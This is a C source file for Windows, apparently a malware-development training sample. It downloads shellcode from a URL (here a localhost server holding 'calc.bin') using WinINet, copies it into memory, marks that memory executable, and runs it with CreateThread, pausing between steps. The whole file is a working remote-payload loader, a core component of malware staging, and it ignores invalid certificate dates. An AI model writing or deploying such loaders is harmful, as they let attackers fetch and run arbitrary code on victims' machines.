#include <windows.h>
#include <stdio.h>
#include <wininet.h>

// Python -m http.server 8000
// Have calc.bin in the directory
#define PAYLOAD_URL	L"http://127.0.0.1:8080/calc.bin"

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = NULL;
	
	SIZE_T		sSize             = NULL;
	PBYTE		pBytes            = NULL,
			    pTmpBytes         = NULL;

    // Open An Internet Session
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

    // Open a Handle To Payload
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

    // Allocating a buffer for the payload
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
        printf("[!] LocalAlloc Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){
		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}
        
		// Updating the size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			return FALSE;
		}
		
		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer 
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}
	}
	
	*pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

int main() {
	PBYTE	pPayload        = NULL;
	SIZE_T	sPayloadSize    = NULL;

    printf("[i] Getting payload from: %ls", PAYLOAD_URL);
	// Reading the payload 
	if (!GetPayloadFromUrl(PAYLOAD_URL, &pPayload, &sPayloadSize)) {
		return -1;
	}
    printf("[+] Done\n");

	printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());
    printf("[#] Press <Enter> To Allocate ... ");
    getchar();

	PVOID pShellcodeAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	printf("[#] Press <Enter> To Write Payload ... ");
    getchar();
    memcpy(pShellcodeAddress, pPayload, sPayloadSize);

    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }
	
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

	return 0;
}
